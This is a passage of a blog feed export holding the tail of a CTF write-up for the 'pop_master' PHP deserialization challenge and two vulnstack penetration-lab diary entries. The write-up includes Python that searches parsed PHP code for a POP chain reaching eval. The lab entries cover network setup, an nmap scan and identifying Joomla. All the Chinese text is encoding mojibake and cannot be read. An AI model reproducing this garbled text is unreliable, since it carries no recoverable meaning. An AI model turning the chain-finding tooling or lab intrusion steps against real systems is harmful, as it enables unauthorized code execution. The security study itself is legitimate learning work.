class="hljs-keyword">def</span> <span class="hljs-title function_">is_good_assign</span>(<span class="hljs-params">ctx_param, node: Assignment</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;åˆ¤æ–­èµ‹å€¼æ“ä½œæ˜¯å¦å¯ç»§ç»­åˆ©ç”¨&quot;&quot;&quot;</span><br>    <br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == Assignment<span class="hljs-comment"># åˆ¤æ–­ä¸ºèµ‹å€¼æ“ä½œ</span><br>    <span class="hljs-keyword">if</span> ctx_param.name == node.node.name:<span class="hljs-comment"># åˆ¤æ–­æ”¹å˜çš„å‚æ•°æ˜¯å¦ä¸ºæ‰€éœ€å‚æ•°</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) == BinaryOp:<span class="hljs-comment"># åˆ¤æ–­ç­‰å·å³è¾¹æ˜¯å¦ä¸º äºŒå…ƒæ“ä½œ</span><br>            <span class="hljs-keyword">if</span> node.expr.op == <span class="hljs-string">&#x27;.&#x27;</span>:<span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦ä¸º . è¿æ¥æ“ä½œ</span><br>                <span class="hljs-keyword">if</span> node.expr.left.name == ctx_param.name:<span class="hljs-comment"># åˆ¤æ–­ . å·¦ä¾§çš„æ˜¯å¦ä¸ºæ‰€éœ€å‚æ•°</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(node)<br>                <span class="hljs-comment"># unexpected</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) == Variable:<span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦ä¸ºå˜é‡ç›´æ¥èµ‹å€¼</span><br>            <span class="hljs-keyword">if</span> node.expr.name == ctx_param.name:<span class="hljs-comment"># åˆ¤æ–­ç­‰å·å³è¾¹æ˜¯å¦ä¸ºæ‰€éœ€å‚æ•°</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p> åˆ¤æ–­ <strong>èµ‹å€¼æ“ä½œ</strong> æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸ä¼ é€’å‚æ•°å†…å®¹ï¼Œå³æ˜¯å¦ä¸ <strong>æ¶ˆæ¯’</strong> </p><ul><li>è‹¥ç­‰å·å·¦ä¾§ä¸æ˜¯æ‰€éœ€å‚æ•°ï¼Œåˆ™èµ‹å€¼æ— å½±å“ï¼Œè¿”å› True</li><li>è‹¥ç­‰å·å³ä¾§ä¸º . è¿æ¥æ“ä½œï¼Œä¸” . çš„å·¦ä¾§æ˜¯æ‰€éœ€å‚æ•°ï¼Œåˆ™èµ‹å€¼ç›¸å½“äºå‚æ•°åŠ åç¼€ï¼Œä¸å½±å“ä»£ç æ‰§è¡Œï¼Œè¿”å›True</li><li>è‹¥ç­‰å·å³ä¾§ä¸º å˜é‡ ä¸”ä¸ºæ‰€éœ€å‚æ•°ï¼Œåˆ™èµ‹å€¼ç­‰åŒäºè½¬åŒ–ï¼Œä¸å½±å“ä»£ç æ‰§è¡Œï¼Œè¿”å› True</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_if</span>(<span class="hljs-params">ctx_param, node: If</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;åˆ¤æ–­ifè¯­å¥æ˜¯å¦å¯ç”¨&quot;&quot;&quot;</span><br>    <br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node)== If<span class="hljs-comment"># èŠ‚ç‚¹ç±»å‹ä¸º if</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> BinaryOp:<span class="hljs-comment"># ifæ¡ä»¶æ˜¯å¦ä¸ºäºŒå…ƒæ“ä½œ</span><br>        <span class="hljs-comment"># è‹¥äºŒå…ƒæ“ä½œçš„è®¡ç®—ç»“æœä¸ºçœŸï¼Œä¸”ifä»£ç å—ä¸­æœ‰èµ‹å€¼æ“ä½œï¼Œèµ‹å€¼æ“ä½œæ¶ˆæ¯’æˆåŠŸï¼Œåˆ™è¿”å› Falseï¼Œå¦åˆ™å‡è¿”å›True</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(node.expr.left)+node.expr.op+<span class="hljs-built_in">str</span>(node.expr.right)):<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> node.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(ctx_param, n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>                <br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> FunctionCall:<span class="hljs-comment"># æ˜¯å¦ä¸ºå‡½æ•°è°ƒç”¨</span><br>        <span class="hljs-comment"># æ­¤å¤„ç”±äºé¢˜ç›®ç”Ÿæˆè§„å¾‹ï¼Œifæ¡ä»¶ä¸­çš„å‡½æ•°è°ƒç”¨åªä¼šæ£€æµ‹æ˜¯å¦å­˜åœ¨ï¼Œä¸”æ£€æµ‹åä¸€å®šæ‰§è¡Œ</span><br>        <span class="hljs-comment"># å…ˆåˆ¤æ–­æ˜¯å¦ä¸ºé¢„æœŸæƒ…å†µï¼Œç„¶åæå–å‡ºæ‰“ç®—è°ƒç”¨çš„å‡½æ•°åï¼Œæ‰¾åˆ°å¯¹åº”çš„ç±»ï¼Œå¹¶å°†æ‰€è°ƒç”¨çš„å‚æ•°ä¸€å¹¶ä¼ å…¥searchæ¨¡å—</span><br>        <span class="hljs-keyword">if</span> node.expr.name == <span class="hljs-string">&#x27;method_exists&#x27;</span>:<br>            func = node.expr.params[<span class="hljs-number">1</span>].node<br>            <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">type</span>(func) == <span class="hljs-built_in">str</span>)<br>            search(classes[func2class[func]],<br>                   node.expr.params[<span class="hljs-number">0</span>].node.name, func)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected call&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected expr&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>åˆ¤æ–­ifè¯­å¥æ˜¯å¦ä¸å½±å“ä»£ç æ‰§è¡Œ</p><ul><li>é¢˜ç›®ä¸­çš„ifåªæœ‰ä¸¤ç§æƒ…å†µï¼šåˆ¤æ–­äºŒå…ƒæ“ä½œå¹¶èµ‹å€¼ï¼Œåˆ¤æ–­å‡½æ•°æ˜¯å¦å­˜åœ¨å¹¶è°ƒç”¨</li><li>é’ˆå¯¹äºŒå…ƒæ“ä½œï¼Œå…ˆåˆ¤æ–­èƒ½å¦è¿›å…¥ä»£ç å—ï¼Œåœ¨åˆ¤æ–­ä»£ç å—é‡Œçš„èµ‹å€¼æ“ä½œæ˜¯å¦æœ‰æ•ˆ</li><li>é’ˆå¯¹å‡½æ•°è°ƒç”¨ï¼Œç›´æ¥è¿›å…¥ç›®æ ‡ç±»ä¸­æœå¯»è¢«è°ƒå‡½æ•°ï¼Œå®Œæˆç‚¹åˆ°ç‚¹çš„è¿æ¥(æœ€åå½¢æˆè°ƒç”¨é“¾)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_method</span>(<span class="hljs-params">ctx, method</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;åˆ¤æ–­å½“å‰æ–¹æ³•æ˜¯å¦å¯ç”¨&quot;&quot;&quot;</span><br>    ctx.param = method.params[<span class="hljs-number">0</span>]<span class="hljs-comment"># æš‚æ—¶ä¸æ¸…æ¥šæœ‰å•¥ç”¨ï¼Œçœ‹èµ·æ¥æ²¡ç”¨ï¼Œä½†è°çŸ¥é“å‘¢</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> method.nodes:<span class="hljs-comment"># ä¸€ä¸ªå‡½æ•°é‡Œæœ‰å¤šè¡Œä»£ç ï¼Œä¾æ¬¡åˆ¤æ–­ä»£ç æ ¼å¼å¹¶è§¦å‘ç›¸åº”ç»“å±€</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> For:<span class="hljs-comment"># foræ¯”è¾ƒå¥½å¤„ç†ï¼Œç›´æ¥çœ‹èµ‹å€¼æ˜¯å¦æœ‰æ•ˆ(å› ä¸ºé¢˜ç›®åªæœ‰èµ‹å€¼)</span><br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> i.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> If:<span class="hljs-comment"># è°ƒï¼è°ƒä¸Šé¢çš„æ¨¡å—</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> handle_if(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> MethodCall:<span class="hljs-comment"># ç»§ç»­è°ƒï¼</span><br>            search(classes[func2class[i.name]], i.node.name, i.name)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Assignment:<span class="hljs-comment"># è¿˜åœ¨è°ƒï¼</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Eval:<span class="hljs-comment"># the endï¼Œæ‹¿åˆ°è¿™ä¸ªå°±ç»“æŸ</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>åˆ¤æ–­å½“å‰çš„å‡½æ•°æ˜¯å¦æœ‰æ•ˆä¼ é€’ï¼Œç±»ä¼¼äºä¸€è¡Œè¡Œè¯»ä»£ç ï¼Œæ¯ç§æƒ…å†µè°ƒç”¨ç›¸å…³çš„å¤„ç†æ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">node, attr, method, path=[]</span>):<br>    path.append((node, attr, method))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> node.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method <span class="hljs-keyword">and</span> i.name == method:<br>            ctx = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>            <span class="hljs-keyword">if</span> handle_method(ctx, i):<br>                good_paths.append(<span class="hljs-built_in">list</span>(path))<br>    path.pop()<br></code></pre></td></tr></table></figure><p>é‡å¤´æˆï¼Œæ·±åº¦ä¼˜å…ˆç®—æ³•æ‰¾ popé“¾ï¼Œæ¯é‡åˆ°ä¸€ä¸ªè¢«è°ƒå‡½æ•°å°±æ‰¾åˆ°å¯¹åº”çš„ç±»å»å°è¯•è°ƒç”¨ï¼Œé€šè¿‡ä¸Šé¢çš„æ¨¡å—åˆ¤æ–­å½“å‰å‡½æ•°èƒ½å¦æˆåŠŸä¼ é€’ä¿¡æ¯ï¼Œç›´åˆ°è¿”å› Trueï¼Œä¹Ÿå°±æ˜¯æ‰¾åˆ° eval å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">good_paths = []<br>search(classes[<span class="hljs-string">&#x27;dLEWX3&#x27;</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;L8IHXt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(good_paths))<br><span class="hljs-keyword">for</span> n, a, m <span class="hljs-keyword">in</span> good_paths[<span class="hljs-number">0</span>]:<br>    <span class="hljs-built_in">print</span>(n.name, a, m)<br></code></pre></td></tr></table></figure><p>åˆ°è¿™ä¸€æ­¥å°±å·²ç»è§£å†³é—®é¢˜äº†ï¼ŒæˆåŠŸæ‰¾åˆ°äº†ä¸€æ¡è°ƒç”¨é“¾å¹¶æ‰“å°å‡ºæ¥ï¼Œé€šè¿‡ä¸€ä¸ªå…¨å±€å˜é‡ <code>good_paths</code> å­˜å‚¨</p><p>å†å¾€ä¸‹å°±æ˜¯è‡ªåŠ¨ç”Ÿæˆ <code>payload</code> å’Œ è‡ªåŠ¨æäº¤ï¼Œè¿™ä¹Ÿæ˜¯ä½©æœè€å­¦é•¿çš„åœ°æ–¹ï¼Œå·æ‡’éƒ½å·çš„æ— å¯æŒ‘å‰”ï¼Œç»™çš„expå¼€ç®±å³ç”¨ï¼Œå®Œå…¨ä¸éœ€è¦äºŒæ¬¡å¤„ç†ï¼Œèµï¼</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æ•´ä½“å›é¡¾ï¼Œå­¦é•¿çš„expå¯ä»¥ä» <strong>æ±¡ç‚¹åˆ†æ</strong> çš„è§’åº¦æ¥ç†è§£ã€‚</p><p>æ±¡ç‚¹åˆ†æå®šä¹‰ï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">æ±¡ç‚¹åˆ†æå¯ä»¥æŠ½è±¡æˆä¸€ä¸ªä¸‰å…ƒç»„`&lt;sources,sinks,sanitizers&gt;`çš„å½¢å¼,å…¶ä¸­,source å³æ±¡ç‚¹æº,ä»£è¡¨ç›´æ¥å¼•å…¥ä¸å—ä¿¡ä»»çš„æ•°æ®æˆ–è€…æœºå¯†æ•°æ®åˆ°ç³»ç»Ÿä¸­<span class="hljs-comment">;sinkå³æ±¡ç‚¹æ±‡èšç‚¹,ä»£è¡¨ç›´æ¥äº§ç”Ÿå®‰å…¨æ•æ„Ÿæ“ä½œ(è¿åæ•°æ®å®Œæ•´æ€§)æˆ–è€…æ³„éœ²éšç§æ•°æ®åˆ°å¤–ç•Œ(è¿åæ•°æ®ä¿å¯†æ€§);sanitizerå³æ— å®³å¤„ç†,ä»£è¡¨é€šè¿‡æ•°æ®åŠ å¯†æˆ–è€…ç§»é™¤å±å®³æ“ä½œç­‰æ‰‹æ®µä½¿æ•°æ®ä¼ æ’­ä¸å†å¯¹è½¯ä»¶ç³»ç»Ÿçš„ä¿¡æ¯å®‰å…¨äº§ç”Ÿå±å®³.æ±¡ç‚¹åˆ†æå°±æ˜¯åˆ†æç¨‹åºä¸­ç”±æ±¡ç‚¹æºå¼•å…¥çš„æ•°æ®æ˜¯å¦èƒ½å¤Ÿä¸ç»æ— å®³å¤„ç†,è€Œç›´æ¥ä¼ æ’­åˆ°æ±¡ç‚¹æ±‡èšç‚¹.å¦‚æœä¸èƒ½,è¯´æ˜ç³»ç»Ÿæ˜¯ä¿¡æ¯æµå®‰å…¨çš„;å¦åˆ™,è¯´æ˜ç³»ç»Ÿäº§ç”Ÿäº†éšç§æ•°æ®æ³„éœ²æˆ–å±é™©æ•°æ®æ“ä½œç­‰å®‰å…¨é—®é¢˜.</span><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸­ï¼Œ<code>source</code> å°±æ˜¯ä½œè€…ç•™ä¸‹çš„ååºåˆ—åŒ–å…¥å£ï¼Œä¹Ÿå°±æ˜¯ <code>dLEWX3</code> ç±»çš„ <code>L8IHXt</code> æ–¹æ³•æ¥æ”¶çš„å‚æ•° ï¼Œ<code>sink</code> å°±æ˜¯æˆ‘ä»¬æƒ³å®ç°çš„ <code>eval</code> å‡½æ•°</p><p><code>sanitizer</code> åˆ™æ˜¯è¿‡ç¨‹ä¸­çš„å„ç§æ“ä½œ(ç›´æ¥èµ‹å€¼ï¼Œifåèµ‹å€¼ï¼Œforå†…èµ‹å€¼)ï¼Œè€Œå‡½æ•°çš„ç›¸äº’è°ƒç”¨è¿‡ç¨‹å°±æ˜¯æ±¡ç‚¹çš„ä¼ æ’­è¿‡ç¨‹ï¼Œè€Œæˆ‘ä»¬çš„ <code>good_paths</code> é‡Œå­˜çš„ï¼Œå°±æ˜¯ä¸€æ¡å¯è¡Œçš„æ±¡ç‚¹ä¼ æ’­é“¾(è¿™å¯ä¸good)</p><p>expä¸­å®šä¹‰çš„å„ç§æ¨¡å—å°±åœ¨åšä¸€ä»¶äº‹ï¼šåˆ¤æ–­æ˜¯å¦ <strong>æ¶ˆæ¯’</strong> ï¼Œæ¶ˆæ¯’äº†å°±è¿”å› Falseï¼Œç„¶ååœ¨ <code>search</code> æ¨¡å—é‡ŒæŠŠå½“å‰è·¯å¾„ pop æ‰ï¼Œç„¶åè¿›å…¥ä¸‹ä¸€æ¡è¯­å¥ç»§ç»­ï¼Œç›´åˆ°æ‰¾åˆ°å®Œæ•´çš„ä¼ æ’­é“¾æˆ–ä¸å¯è¾¾ã€‚</p><p>ç†è§£äº†åä¼šå‘ç°è¿™ç§é¢˜å…¶å®ä¸éš¾ï¼Œè™½ç„¶çœ‹èµ·æ¥ç±»å¾ˆå¤šï¼Œä½†æ¯ä¸ªè¢«è°ƒå‡½æ•°éƒ½åªåœ¨å”¯ä¸€çš„ç±»ä¸­å£°æ˜ï¼Œä¹Ÿå°±æ˜¯ä»å‡½æ•°åˆ°ç±»æ˜¯å…·æœ‰å”¯ä¸€æ€§çš„ï¼Œè¿™å°±é¿å…äº†ç›¸äº’è°ƒç”¨é™·å…¥å¾ªç¯çš„å°´å°¬å¤„å¢ƒï¼Œæœ€å¤šä¼šåœ¨åŒä¸€ä¸ªå‡½æ•°é‡Œå‡ºç°ä¸¤ä¸‰ä¸ª <code>å²”è·¯å£</code> , å…¶ä½™æ—¶é—´éƒ½åœ¨å‰è¿›å’Œæ¶ˆæ¯’ï¼Œä¹Ÿæ­£å› ä¸ºæ­¤ï¼Œæ‰å¯ç”¨è¾ƒä¸ºç®€æ´çš„ä»£ç å®Œæˆé¢˜ç›®ã€‚</p><p>æœ€åå†æ¬¡æ„Ÿè°¢è€å­¦é•¿çš„å¸®åŠ© ğŸ˜‹</p><h5 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h5><p>[å¼ºç½‘æ¯<a href="https://www.anquanke.com/post/id/244153">pop_master]ä¸[é™€é‚£å¤š]èµ›é¢˜çš„å‡ºé¢˜è®°å½•-å®‰å…¨å®¢</a></p><p><a href="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/">pythonå®ç°çš„phpåºåˆ—åŒ– (frankli.site)</a></p><p><a href="https://www.freebuf.com/articles/web/279680.html">pop_masterçš„èŠ±å¼è§£é¢˜æ€è·¯ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://pypi.com.cn/project/phply/">phply - ä½¿ç”¨ PLY å®ç°çš„ PHP æºçš„è¯æ³•åˆ†æå™¨å’Œè§£æå™¨_PyPIä¸­æ–‡ç½‘</a></p><p><a href="https://www.anquanke.com/post/id/264231">ä»ä¸€é“é¢˜æµ…è°ˆæ±¡ç‚¹åˆ†æ-å®‰å…¨å®¢</a></p><p><a href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">ç®€å•ç†è§£æ±¡ç‚¹åˆ†ææŠ€æœ¯ | K0rz3nâ€™s Blog</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ </tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstacké¶åœºæ—¥è®°-4</title>
    <link href="/2023/12/12/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-4/"/>
    <url>/2023/12/12/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-4/</url>
    
    <content type="html"><![CDATA[<h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><p>[TOC]</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><h4 id="å‰ç½®é…ç½®"><a href="#å‰ç½®é…ç½®" class="headerlink" title="å‰ç½®é…ç½®"></a>å‰ç½®é…ç½®</h4><p>ä¸‹è½½å®Œé¶æœºè§£å‹åæ˜¯ <code>ovf</code> æ–‡ä»¶ï¼Œå…ˆåˆ©ç”¨ <code>ovftool</code> è½¬æ¢ä¸º <code>vmx</code> æ–‡ä»¶ï¼Œå†å¯¼å…¥ <code>vmware</code></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"># cmd ç±»ä¼¼è¿™ç§å½¢å¼è½¬æ¢<br>ovftool.exe <span class="hljs-name">D</span>:\vmware\vulnstack\threstç¯å¢ƒ\DC\DC.ovf <span class="hljs-name">D</span>:\vmware\vulnstack\threstç¯å¢ƒ\DC\DC.vmx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>è§£é¢˜è®°å½•</tag>
      
      <tag>å­¦ä¹ </tag>
      
      <tag>vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstacké¶åœºæ—¥è®°-3</title>
    <link href="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/"/>
    <url>/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/</url>
    
    <content type="html"><![CDATA[<h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><p>[TOC]</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>å»ºè®®å†…å­˜130G+ï¼Œæˆ‘é¢„ç•™äº†120Gï¼Œåšåˆ°ä¸€åŠæ²¡å†…å­˜äº†è¿˜è¦åˆ æ¸¸æˆğŸ˜­</p><p>æ”»å‡»æœº </p><ul><li>kali</li></ul><p>é¶æœºï¼š</p><ul><li>web-centos</li><li>web1-ubuntu</li><li>win2008(x64)</li><li>win server 2012(x64)</li><li>pc win7(x64)</li></ul><p>æå‰å¼€å¯ä¸€å—ç½‘å¡ <code>VMnet2</code> é…ç½®ipæ®µ <code>192.168.93.0/24</code>ï¼Œkali å’Œ web æ¡¥æ¥æ¨¡å¼</p><h4 id="ç½‘ç»œç¯å¢ƒ"><a href="#ç½‘ç»œç¯å¢ƒ" class="headerlink" title="ç½‘ç»œç¯å¢ƒ"></a>ç½‘ç»œç¯å¢ƒ</h4><h4 id="å¤–ç½‘"><a href="#å¤–ç½‘" class="headerlink" title="å¤–ç½‘"></a>å¤–ç½‘</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> <span class="hljs-number">192.168.1.28</span><br>web  <span class="hljs-number">192.168.1.29</span><br></code></pre></td></tr></table></figure><h4 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">web</span>  <span class="hljs-number">192.168.93.100</span><br>web1 <br>win2008 <span class="hljs-number">192.168.93.20</span><br>win server <span class="hljs-number">192.168.93.10</span><br>win7  <span class="hljs-number">192.168.93.30</span><br></code></pre></td></tr></table></figure><p>é»‘ç›’æ¸—é€ï¼Œä¸çŸ¥é“é¶æœºå¯åŠ¨å¯†ç å’Œå†…ç½‘é…ç½®ï¼Œä»¥ä¸Šå†…å®¹åªåšç¯å¢ƒé…ç½®å‚è€ƒ</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>ç›®æ ‡ <code>192.168.1.29</code> , <code>nmap</code>æ‰«å¼€æ”¾ç«¯å£ 22,80,3306 </p><p>è®¿é—®80ç½‘é¡µï¼Œä¸€ä¸ªåšå®¢é¡µé¢<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209112545106.png" alt="image-20231209112545106"></p><p>robots.txt</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dts">User-agent: *<br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/administrator/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/bin/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/cache/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/cli/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/components/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/includes/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/installation/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/language/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/layouts/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/libraries/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/logs/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/modules/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/plugins/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/tmp/</span><br></code></pre></td></tr></table></figure><p>ç‚¹å‡»<code>My Blog</code> ä¸‹è½½ <code>index.php</code> æ–‡ä»¶ï¼Œåˆ¤æ–­ç½‘ç«™cmsä¸º <code>joomla</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- generator=&quot;Joomla! - Open Source Content Management&quot; --&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰«ç›®å½•</p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 